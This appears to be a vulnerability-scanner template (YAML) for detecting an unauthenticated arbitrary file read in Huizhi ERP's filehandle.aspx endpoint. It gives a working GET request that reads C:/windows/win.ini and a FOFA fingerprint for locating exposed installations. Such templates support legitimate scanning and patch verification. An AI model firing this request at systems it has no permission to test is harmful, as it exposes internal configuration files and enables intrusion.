id: huizhi-erp-filehandle-fileread

info:
  name: 汇智ERP接口filehandle.aspx存在任意文件读取漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    汇智ERP filehandle.aspx 接口处任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露，导致系统处于极不安全的状态。
    fofa: icon_hash="-642591392"
  reference:
    - https://blog.csdn.net/weixin_45790890/article/details/140934674
  tags: fileread,huizhi
  created: 2025/03/26

rules:
  r0:
    request:
      method: GET
      path: /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini
    expression: |
      response.status == 200 && 
      response.body.bcontains(b'for 16-bit app support')&&
      response.body.bcontains(b'fonts')
expression: r0()
